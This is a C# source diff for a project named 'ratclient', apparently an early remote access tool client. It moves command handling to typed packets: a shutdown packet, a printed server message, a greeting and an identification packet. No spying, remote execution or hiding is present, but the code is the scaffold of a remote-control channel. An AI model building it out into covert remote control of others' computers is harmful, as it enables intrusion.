@@ -1,4 +1,6 @@
-﻿using ratclient.Networking;
+﻿using Interfaces;
+using ratclient.Networking;
+using Packets;
 using System;
 using System.Diagnostics;
 
@@ -24,23 +26,28 @@ namespace ratclient
             Process.GetCurrentProcess().WaitForExit();
         }
 
-        private static bool ProcessCommand(string cmd)
+        private static bool ProcessCommand(IPacket packet)
         {
             /*
              *  This is where you handle incoming commands
              * 
              */
 
-            if (cmd == "shutdown")
+            if (packet.GetType() == typeof(DoShutdownPacket))
             {
                 Environment.Exit(0);
+                return true;
+            } else if (packet.GetType() == typeof(StringMessagePacket ))
+            {
+                StringMessagePacket message = (StringMessagePacket)packet;
+                Console.WriteLine("Server said : " + message.Message );
                 return true;
             }
 
             return false;
         }
 
-        private static void OnMessageReceived(object sender, string message)
+        private static void OnMessageReceived(object sender, IPacket message)
         {
             /*
              * 
@@ -62,12 +69,9 @@ namespace ratclient
                 Console.WriteLine("Connected");
 
                 if (!identified)
-                {
-                    Console.WriteLine("Sending identification");
-
                     Identify(node);
-                    identified = true;
-                }
+
+                node.Send(StringMessagePacket.Create("Hello Mr. Server!!!!!!!"));
             }
             else
             {
@@ -77,7 +81,13 @@ namespace ratclient
 
         private static void Identify(Client client)
         {
-            client.Send("os:Windows 10 Professional|hwid:" + Guid.NewGuid().ToString());
+            client.Send(new IdentificationPacket()
+            {
+                Name = "Charlie",
+                OperatingSystem = "Windows 10 Professional"
+            });
+
+            identified = true;
         }
     }
 }
